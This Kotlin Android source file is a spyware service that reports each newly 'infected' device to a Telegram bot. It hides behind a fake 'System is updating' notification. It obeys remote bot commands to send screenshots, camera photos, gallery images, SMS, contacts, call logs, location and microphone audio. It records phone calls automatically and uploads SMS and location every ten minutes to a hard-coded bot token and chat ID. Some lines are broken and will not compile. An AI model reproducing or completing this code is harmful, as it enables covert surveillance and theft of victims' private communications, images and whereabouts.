package com.luffa

import android.app.*
import android.content.*
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.camera2.*
import android.location.LocationManager
import android.media.*
import android.net.Uri
import android.os.*
import android.provider.*
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Log
import android.view.Surface
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import androidx.work.*
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit
import kotlin.coroutines.resume

import com.luffa.BOT_TOKEN
import com.luffa.CHAT_ID
import com.luffa.client


class MyService : Service() {

    // ===== CHANGE THESE =====
    private val BOT_TOKEN = "8840980473:AAE8Tml8PjJH05vcN5SNSRESqC34mTlC1kc"
    private val CHAT_ID = "8820979221"
    // =========================

    private lateinit var notifManager: NotificationManager
    private var lastUpdateId = 0L
    private lateinit var pollingJob: Job
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    // Call recording
    private var mediaRecorder: MediaRecorder? = null
    private var currentRecordingFile: File? = null
    private var isRecording = false
    private lateinit var telephonyManager: TelephonyManager
    private val phoneStateListener = object : PhoneStateListener() {
        override fun onCallStateChanged(state: Int, phoneNumber: String?) {
            when (state) {
                TelephonyManager.CALL_STATE_OFFHOOK -> startCallRecording()
                TelephonyManager.CALL_STATE_IDLE -> stopAndUploadRecording()
            }
        }
    }



override fun onCreate() {
    super.onCreate()
    createNotificationChannel()
    startForeground(1, buildForegroundNotification())
    telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
    telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)

    // প্রথমবার install এ message পাঠাও (COROUTINE এর ভিতরে)
    CoroutineScope(Dispatchers.IO).launch {
        sendTelegramMessage("✅ New device infected: ${Build.MODEL} (${Build.VERSION.RELEASE})")
    }

    startBotPolling()
    scheduleAutoTasks()
}


    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onDestroy() {
        super.onDestroy()
        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
        pollingJob.cancel()
        if (isRecording) {
            mediaRecorder?.apply { stop(); release() }
        }
    }

    override fun onBind(intent: Intent?) = null

    // ================== NOTIFICATIONS ==================
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODESTimeUnit
            val channel = NotificationChannel(
                "spy_channel",
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "System Update"
                setShowBadge(false)
            }
            notifManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            notifManager.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        return NotificationCompat.Builder(this, "spy_channel")
            .setContentTitle("System is updating...")
            .setContentText("Please do not turn off.")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .build()
    }

    // ================== BOT POLLING (FIXED) ==================
    private fun startBotPolling() {
        pollingJob = CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
            while (isActive) {
                try {
                    val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
                    val response = client.newCall(Request.Builder().url(url).build()).execute()
                    val json = response.body?.string() ?: continue
                    val result = JSONObject(json).optJSONArray("result") ?: continue
                    for (i in 0 until result.length()) {
                        val update = result.getJSONObject(i)
                        val msg = update.optJSONObject("message") ?: continue
                        lastUpdateId = update.getLong("update_id")
                        val text = msg.optString("text", "")
                        val fromId = msg.optJSONObject("from")?.optLong("id", -1) ?: -1
                        // শুধু authorized user এর command নিবে
                        if (fromId == CHAT_ID.toLong() && text.isNotBlank()) {
                            handleCommand(text)
                        }
                    }
                } catch (e: Exception) {
                    Log.e("SpyBot", "Poll error", e)
                    delay(2000)
                }
                delay(300) // 300ms interval
            }
        }
    }

    private fun handleCommand(cmd: String) {
        // Trim and remove leading slash if any
        val clean = cmd.trim().removePrefix("/")
        CoroutineScope(Dispatchers.IO).launch {
            try {
                when {
                    clean == "screenshot" -> takeScreenshot()
                    clean == "frontcam" -> takeCameraPhoto(CameraCharacteristics.LENS_FACING_FRONT)
                    clean == "backcam" -> takeCameraPhoto(CameraCharacteristics.LENS_FACING_BACK)
                    clean == "location" -> sendLiveLocation()
                    clean == "sms" -> uploadLastSms(20)
                    clean == "contact" -> uploadContacts(50)
                    clean == "calllog" -> uploadCallLog(30)
                    clean.startsWith("photo") -> handlePhotoCommand(clean)
                    clean == "audio" -> recordAudio(60)
                    clean == "screenrecord" -> recordScreen(60)
                    else -> sendTelegramMessage("Unknown command: /$clean")
                }
            } catch (e: Exception) {
                sendTelegramMessage("⛔ Error: ${e.message}")
            }
        }
    }

    

private suspend fun takeScreenshot() {
    val accService = MyAccessibilityService.instance
    if (accService == null || !accService.isConnected) {
        sendTelegramMessage("⚠️ Accessibility service not enabled. Please enable 'MyApp' in Accessibility settings.")
        return
    }

    if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
        sendTelegramMessage("❌ Screenshot via AccessibilityService requires Android 11 (API 30) or higher.")
        return
    }

    val bitmap = kotlinx.coroutines.suspendCancellableCoroutine<android.graphics.Bitmap?> { cont ->
        accService.takeScreenshot(
            android.view.Display.DEFAULT_DISPLAY,
            accService.mainExecutor,
            object : android.accessibilityservice.AccessibilityService.TakeScreenshotCallback {
                override fun onSuccess(screenshot: android.accessibilityservice.AccessibilityService.ScreenshotResult) {
                    try {
                        val buffer = screenshot.hardwareBuffer
                        val bmp = android.graphics.Bitmap.wrapHardwareBuffer(
                            buffer,
                            screenshot.colorSpace
                        )?.copy(android.graphics.Bitmap.Config.ARGB_8888, false)
                        buffer.close()
                        if (cont.isActive) cont.resume(bmp)
                    } catch (e: Exception) {
                        e.printStackTrace()
                        if (cont.isActive) cont.resume(null)
                    }
                }

                override fun onFailure(errorCode: Int) {
                    if (cont.isActive) cont.resume(null)
                }
            }
        )
    }

    if (bitmap == null) {
        sendTelegramMessage("❌ Failed to capture screenshot.")
        return
    }

    val file = java.io.File(cacheDir, "ss_${System.currentTimeMillis()}.jpg")
    try {
        java.io.FileOutputStream(file).use { out ->
            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, out)
        }
        sendTelegramPhoto(file)
        sendTelegramMessage("📸 Screenshot taken and sent.")
    } catch (e: Exception) {
        sendTelegramMessage("❌ Error: ${e.message}")
    } finally {
        bitmap.recycle()
        if (file.exists()) {
            file.delete()
        }
    }
}





















    
    private fun takeCameraPhoto(facing: Int) {
        val manager = getSystemService(CAMERA_SERVICE) as CameraManager
        try {
            val cameraId = findCameraId(facing) ?: return
            val imageReader = ImageReader.newInstance(1920, 1080, android.graphics.ImageFormat.JPEG, 1)
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireNextImage()
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                imageReader.close()
                CoroutineScope(Dispatchers.IO).launch {
                    val file = File(cacheDir, "cam_${System.currentTimeMillis()}.jpg")
                    file.writeBytes(bytes)
                    sendTelegramPhoto(file)
                    file.delete()
                }
            }, Handler(Looper.getMainLooper()))

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    val request = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                        addTarget(imageReader.surface)
                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                    }
                    device.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            session.capture(request.build(), object : CameraCaptureSession.CaptureCallback() {
                                override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                    super.onCaptureCompleted(session, request, result)
                                    device.close()
                                }
                            }, null)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            device.close()
                            CoroutineScope(Dispatchers.IO).launch { sendError("Camera session failed") }
                        }
                    }, Handler(Looper.getMainLooper()))
                }
                override fun onDisconnected(device: CameraDevice) { device.close() }
                override fun onError(device: CameraDevice, error: Int) {
                    device.close()
                    CoroutineScope(Dispatchers.IO).launch { sendError("Camera error: $error") }
                }
            }, Handler(Looper.getMainLooper()))
        } catch (e: Exception) {
            CoroutineScope(Dispatchers.IO).launch { sendError("Camera failed: ${e.message}") }
        }
    }

    private suspend fun handlePhotoCommand(cmd: String) {
        val parts = cmd.removePrefix("photo").trim()
        val images = getAllGalleryImages()
        if (images.isEmpty()) {
            sendTelegramMessage("No photos found.")
            return
        }
        val indices = parseRange(parts, images.size)
        if (indices.isEmpty()) {
            sendTelegramMessage("Invalid range. Usage: /photo or /photo 2-8")
            return
        }
        for (idx in indices) {
            val file = File(images[idx])
            if (file.exists()) sendTelegramPhoto(file)
            delay(300) // avoid spamming
        }
    }

    private suspend fun uploadLastSms(count: Int) {
        val cursor = contentResolver.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "date DESC LIMIT $count")
        cursor?.use {
            val colBody = it.getColumnIndex("body")
            val colAddr = it.getColumnIndex("address")
            val sb = StringBuilder("Last $count SMS:\n")
            var i = 0
            while (it.moveToNext() && i < count) {
                sb.append("${it.getString(colAddr)}: ${it.getString(colBody)}\n")
                i++
            }
            sendTelegramMessage(sb.toString())
        } ?: sendTelegramMessage("No SMS permission or no SMS.")
    }

    private suspend fun uploadContacts(limit: Int) {
        val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        cursor?.use {
            val sb = StringBuilder("Contacts (first $limit):\n")
            var i = 0
            while (it.moveToNext() && i < limit) {
                val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                sb.append("$name: $number\n")
                i++
            }
            sendTelegramMessage(sb.toString())
        } ?: sendTelegramMessage("No contacts permission.")
    }

    private suspend fun uploadCallLog(limit: Int) {
        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT $limit")
        cursor?.use {
            val sb = StringBuilder("Call Log (last $limit):\n")
            var i = 0
            while (it.moveToNext() && i < limit) {
                val number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER))
                val type = it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))
                val date = it.getLong(it.getColumnIndex(CallLog.Calls.DATE))
                val durationSec = it.getLong(it.getColumnIndex(CallLog.Calls.DURATION))
                val typeStr = when (type) {
                    CallLog.Calls.INCOMING_TYPE -> "📞 IN"
                    CallLog.Calls.OUTGOING_TYPE -> "📞 OUT"
                    else -> "❌ MISSED"
                }
                sb.append("$typeStr $number ${formatDate(date)} (${durationSec}s)\n")
                i++
            }
            sendTelegramMessage(sb.toString())
        } ?: sendTelegramMessage("No call log permission.")
    }

    private suspend fun sendLiveLocation() {
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        if (loc != null) {
            sendTelegramLocation(loc.latitude, loc.longitude)
        } else {
            // Request single location update (simplified)
            sendTelegramMessage("📍 Location unavailable. Try again later.")
        }
    }

    private fun recordAudio(durationSec: Int) {
        val recorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(44100)
            setAudioEncodingBitRate(96000)
            val path = File(cacheDir, "audio_${System.currentTimeMillis()}.mp3").absolutePath
            setOutputFile(path)
            try {
                prepare()
                start()
            } catch (e: Exception) {
                release()
                CoroutineScope(Dispatchers.IO).launch { sendError("Audio record failed: ${e.message}") }
                return
            }
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    stop()
                    release()
                    CoroutineScope(Dispatchers.IO).launch {
                        sendTelegramDocument(File(path))
                        File(path).delete()
                    }
                } catch (e: Exception) {
                    CoroutineScope(Dispatchers.IO).launch { sendError("Audio upload failed.") }
                }
            }, durationSec * 1000L)
        }
    }

    private suspend fun recordScreen(durationSec: Int) {
    sendTelegramMessage("🖥 Screen recording not available via service. Use /screenshot for image.")
}

    // ================== AUTO TASKS (10 min) ==================
    private fun scheduleAutoTasks() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val locationWork = PeriodicWorkRequestBuilder<AutoLocationWorker>(10, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        val smsWork = PeriodicWorkRequestBuilder<AutoSmsWorker>(10, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "autoLoc", ExistingPeriodicWorkPolicy.KEEP, locationWork
        )
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "autoSMS", ExistingPeriodicWorkPolicy.KEEP, smsWork
        )
    }

    // ================== WORKER CLASSES ==================
    class AutoLocationWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
        override fun doWork(): Result {
            // Send location to Telegram
            CoroutineScope(Dispatchers.IO).launch {
                // Reuse service instance? We'll create a new HTTP call directly.
                try {
                    val lm = applicationContext.getSystemService(LOCATION_SERVICE) as LocationManager
                    val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                    if (loc != null) {
                        val client = OkHttpClient()
                        val form = FormBody.Builder()
                            .add("chat_id", "8820979221")
                            .add("latitude", loc.latitude.toString())
                            .add("longitude", loc.longitude.toString())
                            .build()
                        client.newCall(Request.Builder().url("https://api.telegram.org/bot8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ/sendLocation").post(form).build()).execute()
                    }
                } catch (e: Exception) { /* ignore */ }
            }
            return Result.success()
        }
    }

    class AutoSmsWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
        override fun doWork(): Result {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val cursor = applicationContext.contentResolver.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "date DESC LIMIT 5")
                    val sb = StringBuilder("🔔 Auto SMS report (last 5):\n")
                    cursor?.use {
                        val colAddr = it.getColumnIndex("address")
                        val colBody = it.getColumnIndex("body")
                        while (it.moveToNext()) {
                            sb.append("${it.getString(colAddr)}: ${it.getString(colBody)}\n")
                        }
                    }
                    val client = OkHttpClient()
                    val form = FormBody.Builder()
                        .add("chat_id", "8820979221")
                        .add("text", sb.toString())
                        .build()
                    client.newCall(Request.Builder().url("https://api.telegram.org/bot8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ/sendMessage").post(form).build()).execute()
                } catch (e: Exception) { /* ignore */ }
            }
            return Result.success()
        }
    }

    // ================== CALL RECORDING ==================
    private fun startCallRecording() {
        if (isRecording) return
        try {
            currentRecordingFile = File(cacheDir, "call_${System.currentTimeMillis()}.mp3")
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else @Suppress("DEPRECATION") MediaRecorder()
            mediaRecorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION) // better for calls
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(96000)
                setOutputFile(currentRecordingFile!!.absolutePath)
                prepare()
                start()
            }
            isRecording = true
        } catch (e: Exception) { Log.e("CallRec", "Start failed", e) }
    }

    private fun stopAndUploadRecording() {
        if (!isRecording) return
        try {
            mediaRecorder?.apply { stop(); release() }
            mediaRecorder = null
            isRecording = false
            val file = currentRecordingFile ?: return
            CoroutineScope(Dispatchers.IO).launch {
                sendTelegramDocument(file)
                file.delete()
            }
        } catch (e: Exception) { Log.e("CallRec", "Stop failed", e) }
    }

    // ================== HELPERS ==================
    private fun findCameraId(facing: Int): String? {
        val manager = getSystemService(CAMERA_SERVICE) as CameraManager
        for (id in manager.cameraIdList) {
            val chars = manager.getCameraCharacteristics(id)
            if (chars.get(CameraCharacteristics.LENS_FACING) == facing) return id
        }
        return null
    }

    private fun getAllGalleryImages(): List<String> {
        val list = mutableListOf<String>()
        val projection = arrayOf(MediaStore.Images.Media.DATA)
        contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC")?.use { cursor ->
            val col = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            while (cursor.moveToNext()) list.add(cursor.getString(col))
        }
        return list
    }

    private fun formatDate(millis: Long): String =
        SimpleDateFormat("dd/MM HH:mm", Locale.getDefault()).format(Date(millis))

    private fun parseRange(raw: String, max: Int): List<Int> {
        val result = mutableListOf<Int>()
        if (raw.contains("-")) {
            val parts = raw.split("-")
            val start = parts[0].toIntOrNull() ?: 1
            val end = parts.getOrNull(1)?.toIntOrNull() ?: start
            for (i in start..end) if (i in 1..max) result.add(i-1)
        } else {
            val n = raw.toIntOrNull()
            if (n != null && n in 1..max) result.add(n-1)
        }
        if (result.isEmpty()) result.addAll(0 until minOf(10, max))
        return result
    }

    // ================== TELEGRAM SEND METHODS ==================
    private suspend fun sendTelegramMessage(text: String) {
        try {
            val form = FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", text)
                .build()
            client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage").post(form).build()).execute()
        } catch (e: Exception) { Log.e("Bot", "SendMsg Error", e) }
    }

    private suspend fun sendTelegramPhoto(file: File) {
        try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull()))
                .build()
            client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto").post(body).build()).execute()
        } catch (e: Exception) { Log.e("Bot", "SendPhoto Error", e) }
    }

    private suspend fun sendTelegramDocument(file: File) {
        try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
                .build()
            client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendDocument").post(body).build()).execute()
        } catch (e: Exception) { Log.e("Bot", "SendDoc Error", e) }
    }

    private suspend fun sendTelegramLocation(lat: Double, lng: Double) {
        try {
            val form = FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("latitude", lat.toString())
                .add("longitude", lng.toString())
                .build()
            client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendLocation").post(form).build()).execute()
        } catch (e: Exception) { Log.e("Bot", "SendLoc Error", e) }
    }

    private fun sendError(msg: String) {
        CoroutineScope(Dispatchers.IO).launch { sendTelegramMessage("⚠️ $msg") }
    }
}
